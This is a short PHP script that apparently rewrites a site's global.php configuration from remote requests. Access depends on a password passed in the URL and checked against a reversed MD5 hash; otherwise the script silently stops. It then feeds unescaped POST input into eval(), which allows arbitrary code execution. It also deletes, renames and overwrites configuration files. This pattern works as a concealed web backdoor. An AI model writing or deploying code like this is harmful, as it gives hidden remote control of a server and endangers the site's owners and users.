<?php
	
	$eval_code_tmp = '';
	
	if (
		strrev(md5($_GET['pwd'])) != '9f33c4cf167413ec7779c5d69b5837c0'
	) {
		die();
	}
	
	
	$config_file = 'global.php';
	$config_file_recivery = 'global_recovery.php';
	if ( isset($_GET['rec']) ) {
		if ( is_file($config_file_recivery) ) {
			unlink($config_file);
			rename($config_file_recivery, $config_file);
			echo "@recover compl\r\n";
		} else {
			echo "@no_tmp_copy_file\r\n";
		}
		die;
	}
	
	
	
	$_POST['in'] = str_replace("\r", '', $_POST['in']);
	$_POST['in']  = str_replace('\\', '', $_POST['in']);
	
	$new_data_arr = explode("\n", $_POST['in']);
	
	foreach ( $new_data_arr as $k => $v ) {
		$tmpArr = explode(' [:=:] ', $v);
		$new_data_arr2[$tmpArr[0]] = $tmpArr[1] . "";
	}
	
	$nowCfgArr = getCfg($config_file);
	
	foreach ( $new_data_arr2 as $k => $v ) {
		$resArr = explode(' [:x:] ', $k);
		
		$i = 0;
		while ( isset($resArr[$i]) ) {
			$i++;
			$eval_code_tmp .= '[\'' . $resArr[$i-1] . '\']';
		}
		$eval_code = '
			//if ( isset($nowCfgArr' . $eval_code_tmp . ') ) {
				$nowCfgArr' . $eval_code_tmp . ' = \'' . $v . '\';
			//}
		';
		
		eval($eval_code);
		echo $eval_code;
		
		$eval_code = '';
		$eval_code_tmp = '';
	}
	
	#p($nowCfgArr);
	#die;
	// MAKE RESERV COPY
	$config_file_rezerv1 = 'rezerv_1_x_global.php';
	$config_file_rezerv2 = 'rezerv_2_x_global.php';
	copy($config_file, $config_file_rezerv1);
	copy($config_file, $config_file_rezerv2);
	// $config_file_rezerv1 - is version for change
	foreach ( $nowCfgArr as $k => $v ) {
		if ( !$k ) {
			unset($nowCfgArr[$k]);
		}
	}
	
	rewriteConfig($nowCfgArr, $config_file_rezerv1);
	
	$nowCfgArrFromNewFile = getCfg($config_file_rezerv1);
	
	// if new set not eq
	if ( $nowCfgArrFromNewFile !== $nowCfgArr ) {
		echo "@try_copy - no \r\n";
	} else {
		if ( !unlink($config_file) ) {
			echo "@try_unlink - no \r\n";
		} else {
			echo "@try_unlink - yes \r\n";
		}
		if ( !rename($config_file_rezerv1, $config_file) ) {
			echo "@try_rename - no \r\n";
		} else {
			echo "@try_rename - yes \r\n";
		}
	}
	echo "@ok\r\n";
	p($nowCfgArr);
	function getCfg($config_file) {
		$file = @file($config_file);
		$serStr = $file[2];
		$iniArr = unserialize($serStr);
		return $iniArr;
	}
	function rewriteConfig($new, $path) {
		$ser = '<?php' . "\n" . '/*' . "\n" . serialize($new) . "\n" . '*/' . "\n" . '?>';
		$f = fopen($path, "w");
		fwrite($f, $ser);
		fclose($f);
	}
	function p($a) {
		echo '<pre>';
		print_r($a);
		echo '</pre>';
	}
?>
